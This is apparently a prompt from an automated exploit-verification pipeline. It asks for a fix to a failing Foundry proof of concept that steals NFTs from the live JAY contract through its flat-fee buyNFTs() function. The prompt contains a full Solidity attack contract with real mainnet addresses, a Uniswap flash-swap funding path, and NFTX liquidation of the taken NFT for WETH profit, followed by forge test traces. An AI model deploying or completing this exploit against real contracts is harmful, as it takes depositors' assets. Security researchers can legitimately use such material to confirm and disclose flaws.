You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Vault NFTs can be bought for the same flat fee regardless of collection or value
- claim: `buyNFTs()` lets callers name arbitrary ERC721/ERC1155 assets currently held by the contract, transfers them out, and only charges a count-based ETH fee plus a fixed `buyNftFeeJay` burn per unit. There is no whitelist, per-collection pricing, provenance tracking, or valuation check tying redemption cost to the NFT's actual market value.
- impact: Any valuable NFT deposited into the vault, whether through `buyJay()` or an accidental direct transfer, can be stolen for the same tiny flat fee used for worthless NFTs. This is direct loss of vault inventory and can wipe out NFT backing for the token.
- exploit_paths: ["A user deposits a valuable NFT into the contract through `buyJay()` or transfers it there directly.", "An attacker acquires only the fixed ETH and JAY fees required by `buyNFTs()`.", "The attacker calls `buyNFTs()` with that NFT's contract address and token id and receives the asset at the flat protocol fee."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IERC721Like {
    function balanceOf(address owner) external view returns (uint256);
    function ownerOf(uint256 tokenId) external view returns (address);
    function approve(address to, uint256 tokenId) external;
}

interface IERC721EnumerableLike is IERC721Like {
    function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
}

interface IERC721AQueryableLike is IERC721Like {
    function tokensOfOwner(address owner) external view returns (uint256[] memory);
}

interface IWalletOfOwnerLike is IERC721Like {
    function walletOfOwner(address owner) external view returns (uint256[] memory);
}

interface IERC721ReceiverLike {
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4);
}

interface IJAYLike is IERC20Like {
    function buyNFTs(
        address[] calldata erc721TokenAddress,
        uint256[] calldata erc721Ids,
        address[] calldata erc1155TokenAddress,
        uint256[] calldata erc1155Ids,
        uint256[] calldata erc1155Amounts
    ) external payable;

    function buyJayNoNFT() external payable;
    function getBuyJayNoNFT(uint256 amount) external view returns (uint256);
    function getFees()
        external
        view
        returns (uint256 sellNftFeeEth, uint256 buyNftFeeEth, uint256 buyNftFeeJay, uint256 nextFeeUpdate);
}

interface IWETH9 is IERC20Like {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface INFTXVaultFactoryLike {
    function numVaults() external view returns (uint256);
    function vault(uint256 vaultId) external view returns (address);
}

interface INFTXVaultLike is IERC20Like {
    function assetAddress() external view returns (address);
    function mint(uint256[] calldata tokenIds, uint256[] calldata amounts) external returns (uint256);
}

contract FlawVerifier is IERC721ReceiverLike {
    error AlreadyExecuted();
    error NoLiquidVictimFound();
    error FlashPairUnavailable();
    error UnexpectedFlashCaller(address caller);
    error UnexpectedFlashSender(address sender);
    error InsufficientFlashProceeds(uint256 obtained, uint256 repayment);
    error RedemptionFailed(address token, uint256 tokenId);
    error JayAcquisitionFailed(uint256 ethSpent, uint256 jayObtained, uint256 jayRequired);
    error NoVaultInventoryFound();
    error TokenTransferFailed(address token, address to, uint256 amount);
    error NotEnoughVerifierFunding(uint256 ethAvailable, uint256 jayAvailable, uint256 ethRequired, uint256 jayRequired);

    address public constant TARGET = 0xf2919D1D80Aff2940274014bef534f7791906FF2;
    IWETH9 public constant WETH = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUniswapV2PairLike public constant FLASH_WETH_PAIR =
        IUniswapV2PairLike(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
    IUniswapV2FactoryLike public constant UNISWAP_V2_FACTORY =
        IUniswapV2FactoryLike(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
    IUniswapV2FactoryLike public constant SUSHISWAP_FACTORY =
        IUniswapV2FactoryLike(0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac);
    INFTXVaultFactoryLike public constant NFTX_FACTORY =
        INFTXVaultFactoryLike(0xBE86f647b167567525cCAAfcd6f881F1Ee558216);

    uint256 private constant MIN_BUY_JAY_NO_NFT = 0.0000001 ether;
    uint256 private constant AMM_FEE_NUMERATOR = 997;
    uint256 private constant AMM_FEE_DENOMINATOR = 1000;
    uint256 private constant FLASH_FEE_NUMERATOR = 1000;
    uint256 private constant FLASH_FEE_DENOMINATOR = 997;
    uint256 private constant FLASH_BUFFER = 0.002 ether;
    uint256 private constant MAX_JAY_SOURCE_ETH = 0.05 ether;

    bool public executed;
    address private _profitTokenAddress;
    uint256 private _profitTokenAmount;
    address public stolenCollection;
    uint256 public stolenTokenId;

    address private _plannedCollection;
    uint256 private _plannedTokenId;
    address private _plannedNftxVault;
    address private _plannedSalePair;
    uint256 private _plannedEthFee;
    uint256 private _plannedJayFee;
    uint256 private _flashBorrowWeth;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external payable {
        if (executed) revert AlreadyExecuted();
        executed = true;

        (uint256 ethFee, uint256 jayFee) = _currentFlatFees();

        // exploit_paths[0]: a valuable NFT is already sitting inside the live JAY vault because an earlier user
        // deposited it via `buyJay()` or transferred it there directly. The verifier only discovers such already-
        // deposited inventory; it does not create the vulnerable precondition itself.
        (address victimCollection, uint256 victimId, address nftxVault, address salePair) =
            _locateLiquidVictimDepositedNft();
        if (victimCollection == address(0)) revert NoLiquidVictimFound();

        stolenCollection = victimCollection;
        stolenTokenId = victimId;
        _plannedCollection = victimCollection;
        _plannedTokenId = victimId;
        _plannedNftxVault = nftxVault;
        _plannedSalePair = salePair;
        _plannedEthFee = ethFee;
        _plannedJayFee = jayFee;

        // exploit_paths[1]: the attacker acquires only the fixed ETH and JAY fees required by `buyNFTs()`.
        // Per the required attempt strategy, try verifier-held balances first. Only if the fresh verifier does not
        // already hold enough ETH/JAY do we use a temporary public WETH flash swap to source the same flat fees.
        if (_canExecuteDirectly(ethFee, jayFee)) {
            _acquireJayIfNeeded(jayFee, 0);
            _redeemAndLiquidate(victimCollection, victimId, ethFee, nftxVault, salePair);
            _wrapAllEth();
        } else {
            uint256 jayEthQuote = _quoteEthNeededForJay(jayFee, MAX_JAY_SOURCE_ETH);
            if (jayEthQuote == 0) {
                jayEthQuote = MAX_JAY_SOURCE_ETH;
            }
            _flashBorrowWeth = ethFee + jayEthQuote + FLASH_BUFFER;

            address token0 = FLASH_WETH_PAIR.token0();
            address token1 = FLASH_WETH_PAIR.token1();
            if (token0 != address(WETH) && token1 != address(WETH)) revert FlashPairUnavailable();

            if (token0 == address(WETH)) {
                FLASH_WETH_PAIR.swap(_flashBorrowWeth, 0, address(this), abi.encode(uint256(1)));
            } else {
                FLASH_WETH_PAIR.swap(0, _flashBorrowWeth, address(this), abi.encode(uint256(1)));
            }
        }

        _profitTokenAddress = address(WETH);
        _profitTokenAmount = WETH.balanceOf(address(this));
    }

    function profitToken() external view returns (address) {
        return _profitTokenAddress;
    }

    function profitAmount() external view returns (uint256) {
        return _profitTokenAmount;
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {
        return IERC721ReceiverLike.onERC721Received.selector;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        if (msg.sender != address(FLASH_WETH_PAIR)) revert UnexpectedFlashCaller(msg.sender);
        if (sender != address(this)) revert UnexpectedFlashSender(sender);

        uint256 borrowedWeth = amount0 > 0 ? amount0 : amount1;
        WETH.withdraw(borrowedWeth);

        _acquireJayIfNeeded(_plannedJayFee, _plannedEthFee);

        // exploit_paths[2]: call `buyNFTs()` naming the arbitrary vault-held NFT and receive it for the same flat
        // protocol fee, then use an existing public NFTX/WETH exit to convert the stolen on-chain asset into profit.
        // The NFTX mint/sale is only the realization step; the core exploit remains the flat-fee vault redemption.
        _redeemAndLiquidate(
            _plannedCollection,
            _plannedTokenId,
            _plannedEthFee,
            _plannedNftxVault,
            _plannedSalePair
        );

        _wrapAllEth();

        uint256 repayment = _flashRepayment(borrowedWeth);
        uint256 wethBalance = WETH.balanceOf(address(this));
        if (wethBalance < repayment) {
            revert InsufficientFlashProceeds(wethBalance, repayment);
        }
        if (!IERC20Like(address(WETH)).transfer(address(FLASH_WETH_PAIR), repayment)) {
            revert TokenTransferFailed(address(WETH), address(FLASH_WETH_PAIR), repayment);
        }
    }

    function _currentFlatFees() internal view returns (uint256 ethFee, uint256 jayFee) {
        (, ethFee, jayFee,) = IJAYLike(TARGET).getFees();
    }

    function _canExecuteDirectly(uint256 ethFee, uint256 jayFee) internal view returns (bool) {
        uint256 existingJay = IERC20Like(TARGET).balanceOf(address(this));
        if (existingJay >= jayFee && address(this).balance >= ethFee) {
            return true;
        }

        if (address(this).balance <= ethFee) {
            return false;
        }

        uint256 additionalJayNeeded = jayFee > existingJay ? jayFee - existingJay : 0;
        if (additionalJayNeeded == 0) {
            return true;
        }

        uint256 maxSpendableEth = address(this).balance - ethFee;
        uint256 quote = _quoteEthNeededForJay(additionalJayNeeded, maxSpendableEth);
        return quote != 0;
    }

    function _acquireJayIfNeeded(uint256 jayFee, uint256 ethReservedForBuy) internal {
        uint256 jayBalance = IERC20Like(TARGET).balanceOf(address(this));
        if (jayBalance >= jayFee) {
            return;
        }

        uint256 jayNeeded = jayFee - jayBalance;
        uint256 spendableEth = address(this).balance;
        if (spendableEth <= ethReservedForBuy) {
            revert NotEnoughVerifierFunding(address(this).balance, jayBalance, ethReservedForBuy, jayFee);
        }
        spendableEth -= ethReservedForBuy;

        uint256 ethForJay = _quoteEthNeededForJay(jayNeeded, spendableEth);
        if (ethForJay == 0) {
            ethForJay = spendableEth;
        }

        uint256 jayBefore = IERC20Like(TARGET).balanceOf(address(this));
        IJAYLike(TARGET).buyJayNoNFT{value: ethForJay}();
        uint256 jayAfter = IERC20Like(TARGET).balanceOf(address(this));
        uint256 jayGained = jayAfter > jayBefore ? jayAfter - jayBefore : 0;
        if (jayAfter < jayFee) {
            revert JayAcquisitionFailed(ethForJay, jayGained, jayFee);
        }
    }

    function _redeemAndLiquidate(
        address collection,
        uint256 tokenId,
        uint256 ethFee,
        address nftxVault,
        address salePair
    ) internal {
        _buyVictimNftForFlatFee(collection, tokenId, ethFee);
        if (IERC721Like(collection).ownerOf(tokenId) != address(this)) {
            revert RedemptionFailed(collection, tokenId);
        }

        _tokenizeAndSell(collection, tokenId, nftxVault, salePair);
    }

    function _buyVictimNftForFlatFee(address collection, uint256 tokenId, uint256 ethFee) internal {
        address[] memory erc721TokenAddress = new address[](1);
        erc721TokenAddress[0] = collection;

        uint256[] memory erc721Ids = new uint256[](1);
        erc721Ids[0] = tokenId;

        address[] memory erc1155TokenAddress = new address[](0);
        uint256[] memory erc1155Ids = new uint256[](0);
        uint256[] memory erc1155Amounts = new uint256[](0);

        IJAYLike(TARGET).buyNFTs{value: ethFee}(
            erc721TokenAddress, erc721Ids, erc1155TokenAddress, erc1155Ids, erc1155Amounts
        );
    }

    function _locateLiquidVictimDepositedNft()
        internal
        view
        returns (address collection, uint256 tokenId, address nftxVault, address salePair)
    {
        address[] memory candidates = _candidateCollections();
        bool foundAnyInventory;

        for (uint256 index = 0; index < candidates.length; index++) {
            address candidate = candidates[index];
            if (!_hasCode(candidate)) {
                continue;
            }

            uint256 balance = _erc721BalanceOf(candidate, TARGET);
            if (balance == 0) {
                continue;
            }
            foundAnyInventory = true;

            (bool foundTokenId, uint256 locatedTokenId) = _tokenOfOwnerByIndex(candidate, TARGET, 0);
            if (!foundTokenId) {
                (foundTokenId, locatedTokenId) = _tokensOfOwner(candidate, TARGET);
            }
            if (!foundTokenId) {
                (foundTokenId, locatedTokenId) = _walletOfOwner(candidate, TARGET);
            }
            if (!foundTokenId) {
                continue;
            }

            nftxVault = _findNftxVaultForAsset(candidate);
            if (nftxVault == address(0)) {
                continue;
            }

            salePair = _findBestVaultWethPair(nftxVault);
            if (salePair == address(0)) {
                continue;
            }

            return (candidate, locatedTokenId, nftxVault, salePair);
        }

        if (!foundAnyInventory) {
            revert NoVaultInventoryFound();
        }
        return (address(0), 0, address(0), address(0));
    }

    function _findNftxVaultForAsset(address asset) internal view returns (address vaultAddress) {
        uint256 vaultCount;
        try NFTX_FACTORY.numVaults() returns (uint256 count) {
            vaultCount = count;
        } catch {
            return address(0);
        }

        for (uint256 vaultId = 1; vaultId <= vaultCount; vaultId++) {
            vaultAddress = _vaultIfMatches(vaultId, asset);
            if (vaultAddress != address(0)) {
                return vaultAddress;
            }
        }

        for (uint256 vaultId = 0; vaultId < vaultCount; vaultId++) {
            vaultAddress = _vaultIfMatches(vaultId, asset);
            if (vaultAddress != address(0)) {
                return vaultAddress;
            }
        }

        return address(0);
    }

    function _vaultIfMatches(uint256 vaultId, address asset) internal view returns (address vaultAddress) {
        try NFTX_FACTORY.vault(vaultId) returns (address candidate) {
            if (candidate == address(0)) {
                return address(0);
            }
            try INFTXVaultLike(candidate).assetAddress() returns (address assetAddress) {
                if (assetAddress == asset) {
                    return candidate;
                }
            } catch {}
        } catch {}
        return address(0);
    }

    function _findBestVaultWethPair(address vault) internal view returns (address) {
        address sushiPair = _usablePair(SUSHISWAP_FACTORY.getPair(vault, address(WETH)), vault);
        address uniPair = _usablePair(UNISWAP_V2_FACTORY.getPair(vault, address(WETH)), vault);

        if (sushiPair == address(0)) {
            return uniPair;
        }
        if (uniPair == address(0)) {
            return sushiPair;
        }

        uint256 sushiQuote = _quoteWethOut(sushiPair, vault, 1 ether);
        uint256 uniQuote = _quoteWethOut(uniPair, vault, 1 ether);
        return sushiQuote >= uniQuote ? sushiPair : uniPair;
    }

    function _usablePair(address pair, address vault) internal view returns (address) {
        if (pair == address(0)) {
            return address(0);
        }

        address token0;
        address token1;
        uint112 reserve0;
        uint112 reserve1;

        try IUniswapV2PairLike(pair).token0() returns (address token0_) {
            token0 = token0_;
        } catch {
            return address(0);
        }

        try IUniswapV2PairLike(pair).token1() returns (address token1_) {
            token1 = token1_;
        } catch {
            return address(0);
        }

        try IUniswapV2PairLike(pair).getReserves() returns (uint112 reserve0_, uint112 reserve1_, uint32) {
            reserve0 = reserve0_;
            reserve1 = reserve1_;
        } catch {
            return address(0);
        }

        bool matches =
            (token0 == vault && token1 == address(WETH)) || (token1 == vault && token0 == address(WETH));
        if (!matches || reserve0 == 0 || reserve1 == 0) {
            return address(0);
        }

        return pair;
    }

    function _tokenizeAndSell(address collection, uint256 tokenId, address nftxVault, address salePair)
        internal
        returns (uint256 wethOut)
    {
        IERC721Like(collection).approve(nftxVault, tokenId);

        uint256[] memory tokenIds = new uint256[](1);
        tokenIds[0] = tokenId;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1;

        uint256 vaultBefore = IERC20Like(nftxVault).balanceOf(address(this));
        INFTXVaultLike(nftxVault).mint(tokenIds, amounts);
        uint256 vaultAmountIn = IERC20Like(nftxVault).balanceOf(address(this)) - vaultBefore;

        wethOut = _swapExactTokenForWeth(nftxVault, salePair, vaultAmountIn);
    }

    function _swapExactTokenForWeth(address tokenIn, address pair, uint256 amountIn) internal returns (uint256 amountOut) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        address token0 = IUniswapV2PairLike(pair).token0();
        address token1 = IUniswapV2PairLike(pair).token1();

        if (token0 == tokenIn && token1 == address(WETH)) {
            amountOut = _getAmountOut(amountIn, reserve0, reserve1);
            if (!IERC20Like(tokenIn).transfer(pair, amountIn)) {
                revert TokenTransferFailed(tokenIn, pair, amountIn);
            }
            IUniswapV2PairLike(pair).swap(0, amountOut, address(this), new bytes(0));
            return amountOut;
        }

        if (token1 == tokenIn && token0 == address(WETH)) {
            amountOut = _getAmountOut(amountIn, reserve1, reserve0);
            if (!IERC20Like(tokenIn).transfer(pair, amountIn)) {
                revert TokenTransferFailed(tokenIn, pair, amountIn);
            }
            IUniswapV2PairLike(pair).swap(amountOut, 0, address(this), new bytes(0));
            return amountOut;
        }

        return 0;
    }

    function _quoteEthNeededForJay(uint256 jayNeeded, uint256 maxSpendableEth) internal view returns (uint256) {
        if (jayNeeded == 0 || maxSpendableEth <= MIN_BUY_JAY_NO_NFT) {
            return 0;
        }

        uint256 highQuote;
        try IJAYLike(TARGET).getBuyJayNoNFT(maxSpendableEth) returns (uint256 quote) {
            highQuote = quote;
        } catch {
            return 0;
        }

        if (highQuote < jayNeeded) {
            return 0;
        }

        uint256 low = MIN_BUY_JAY_NO_NFT + 1;
        uint256 high = maxSpendableEth;

        while (low < high) {
            uint256 mid = low + (high - low) / 2;
            uint256 midQuote;
            try IJAYLike(TARGET).getBuyJayNoNFT(mid) returns (uint256 quote) {
                midQuote = quote;
            } catch {
                return 0;
            }

            if (midQuote >= jayNeeded) {
                high = mid;
            } else {
                low = mid + 1;
            }
        }

        return high;
    }

    function _erc721BalanceOf(address token, address owner) internal view returns (uint256 balance) {
        (bool success, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC721Like.balanceOf.selector, owner));
        if (!success || data.length < 32) {
            return 0;
        }
        balance = abi.decode(data, (uint256));
    }

    function _tokenOfOwnerByIndex(address token, address owner, uint256 index)
        internal
        view
        returns (bool found, uint256 tokenId)
    {
        (bool success, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(IERC721EnumerableLike.tokenOfOwnerByIndex.selector, owner, index)
        );
        if (!success || data.length < 32) {
            return (false, 0);
        }
        return (true, abi.decode(data, (uint256)));
    }

    function _tokensOfOwner(address token, address owner) internal view returns (bool found, uint256 tokenId) {
        (bool success, bytes memory data) =
            token.staticcall(abi.encodeWithSelector(IERC721AQueryableLike.tokensOfOwner.selector, owner));
        if (!success || data.length < 32) {
            return (false, 0);
        }

        uint256[] memory tokenIds = abi.decode(data, (uint256[]));
        if (tokenIds.length == 0) {
            return (false, 0);
        }
        return (true, tokenIds[0]);
    }

    function _walletOfOwner(address token, address owner) internal view returns (bool found, uint256 tokenId) {
        (bool success, bytes memory data) =
            token.staticcall(abi.encodeWithSelector(IWalletOfOwnerLike.walletOfOwner.selector, owner));
        if (!success || data.length < 32) {
            return (false, 0);
        }

        uint256[] memory tokenIds = abi.decode(data, (uint256[]));
        if (tokenIds.length == 0) {
            return (false, 0);
        }
        return (true, tokenIds[0]);
    }

    function _quoteWethOut(address pair, address tokenIn, uint256 amountIn) internal view returns (uint256) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        address token0 = IUniswapV2PairLike(pair).token0();
        address token1 = IUniswapV2PairLike(pair).token1();

        if (token0 == tokenIn && token1 == address(WETH)) {
            return _getAmountOut(amountIn, reserve0, reserve1);
        }
        if (token1 == tokenIn && token0 == address(WETH)) {
            return _getAmountOut(amountIn, reserve1, reserve0);
        }
        return 0;
    }

    function _flashRepayment(uint256 amount) internal pure returns (uint256) {
        return ((amount * FLASH_FEE_NUMERATOR) / FLASH_FEE_DENOMINATOR) + 1;
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
            return 0;
        }

        uint256 amountInWithFee = amountIn * AMM_FEE_NUMERATOR;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = (reserveIn * AMM_FEE_DENOMINATOR) + amountInWithFee;
        return numerator / denominator;
    }

    function _wrapAllEth() internal {
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            WETH.deposit{value: ethBalance}();
        }
    }

    function _hasCode(address account) internal view returns (bool) {
        return account != address(0) && account.code.length != 0;
    }

    function _candidateCollections() internal pure returns (address[] memory collections) {
        collections = new address[](23);
        collections[0] = 0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D;
        collections[1] = 0x60E4d786628Fea6478F785A6d7e704777c86a7c6;
        collections[2] = 0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e;
        collections[3] = 0xED5AF388653567Af2F388E6224dC7C4b3241C544;
        collections[4] = 0x23581767a106ae21c074b2276D25e5C3e136a68b;
        collections[5] = 0x306b1ea3ecdf94aB739F1910bbda052Ed4A9f949;
        collections[6] = 0x7Bd29408f11D2bFC23c34f18275bBf23bB716Bc7;
        collections[7] = 0xBd3531dA5CF5857e7CfAA92426877b022e612cf8;
        collections[8] = 0xe785E82358879F061BC3dcAC6f0444462D4b5330;
        collections[9] = 0x1A92f7381B9F03921564a437210bB9396471050C;
        collections[10] = 0x34d85c9CDeB23FA97cb08333b511ac86E1C4E258;
        collections[11] = 0x4297394c20800E8a38A619A243E9BbE7681Ff24E;
        collections[12] = 0xbCe3781ae7Ca1a5e050Bd9C4c77369867eBc307e;
        collections[13] = 0x6339e5E072086621540D0362C4e3Cea0d643E114;
        collections[14] = 0x8821BeE2ba0dF28761AffF119D66390D594CD280;
        collections[15] = 0x524cAB2ec69124574082676e6F654a18df49A048;
        collections[16] = 0x5Af0d9827dfA7f7CbD2EE83494613Df4D1B77C75;
        collections[17] = 0xFBeef911Dc5821886e1dda71586d90eD28174B7d;
        collections[18] = 0x59468516a8259058baD1cA5F8f4BFF190d30E066;
        collections[19] = address(uint160(0x0079fcdef22feed20eddacbb2587640e45491b757f));
        collections[20] = address(uint160(0x00ba30e5f9bb24caa003a52faa5cacecf37febc783));
        collections[21] = address(uint160(0x00a3aee8bce55beea1951ef834b99f3ac60d1abeeb));
        collections[22] = address(0);
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 3.80s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 168630)
Traces:
  [168630] FlawVerifierTest::testExploit()
    ├─ [2404] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [159744] FlawVerifier::executeOnOpportunity()
    │   ├─ [9190] 0xf2919D1D80Aff2940274014bef534f7791906FF2::getFees() [staticcall]
    │   │   └─ ← [Return] 1618122977346278 [1.618e15], 8130081300813008 [8.13e15], 5788320441755007652 [5.788e18], 1663886183 [1.663e9]
    │   ├─ [2708] 0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D::balanceOf(0xf2919D1D80Aff2940274014bef534f7791906FF2) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [3034] 0x60E4d786628Fea6478F785A6d7e704777c86a7c6::balanceOf(0xf2919D1D80Aff2940274014bef534f7791906FF2) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [3012] 0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e::balanceOf(0xf2919D1D80Aff2940274014bef534f7791906FF2) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2718] 0xED5AF388653567Af2F388E6224dC7C4b3241C544::balanceOf(0xf2919D1D80Aff2940274014bef534f7791906FF2) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2692] 0x23581767a106ae21c074b2276D25e5C3e136a68b::balanceOf(0xf2919D1D80Aff2940274014bef534f7791906FF2) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2634] 0x306b1ea3ecdf94aB739F1910bbda052Ed4A9f949::balanceOf(0xf2919D1D80Aff2940274014bef534f7791906FF2) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2719] 0x7Bd29408f11D2bFC23c34f18275bBf23bB716Bc7::balanceOf(0xf2919D1D80Aff2940274014bef534f7791906FF2) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2991] 0xBd3531dA5CF5857e7CfAA92426877b022e612cf8::balanceOf(0xf2919D1D80Aff2940274014bef534f7791906FF2) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [3012] 0xe785E82358879F061BC3dcAC6f0444462D4b5330::balanceOf(0xf2919D1D80Aff2940274014bef534f7791906FF2) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2635] 0x1A92f7381B9F03921564a437210bB9396471050C::balanceOf(0xf2919D1D80Aff2940274014bef534f7791906FF2) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2749] 0x34d85c9CDeB23FA97cb08333b511ac86E1C4E258::balanceOf(0xf2919D1D80Aff2940274014bef534f7791906FF2) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2620] 0x4297394c20800E8a38A619A243E9BbE7681Ff24E::balanceOf(0xf2919D1D80Aff2940274014bef534f7791906FF2) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2718] 0xbCe3781ae7Ca1a5e050Bd9C4c77369867eBc307e::balanceOf(0xf2919D1D80Aff2940274014bef534f7791906FF2) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2641] 0x524cAB2ec69124574082676e6F654a18df49A048::balanceOf(0xf2919D1D80Aff2940274014bef534f7791906FF2) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [3445] 0xFBeef911Dc5821886e1dda71586d90eD28174B7d::balanceOf(0xf2919D1D80Aff2940274014bef534f7791906FF2) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2847] 0x59468516a8259058baD1cA5F8f4BFF190d30E066::balanceOf(0xf2919D1D80Aff2940274014bef534f7791906FF2) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2990] 0x79FCDEF22feeD20eDDacbB2587640e45491b757f::balanceOf(0xf2919D1D80Aff2940274014bef534f7791906FF2) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2650] 0xa3AEe8BcE55BEeA1951EF834b99f3Ac60d1ABeeB::balanceOf(0xf2919D1D80Aff2940274014bef534f7791906FF2) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Revert] NoVaultInventoryFound()
    └─ ← [Revert] exploit call reverted

Backtrace:
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 4.95s (4.91s CPU time)

Ran 1 test suite in 4.97s (4.95s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 168630)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
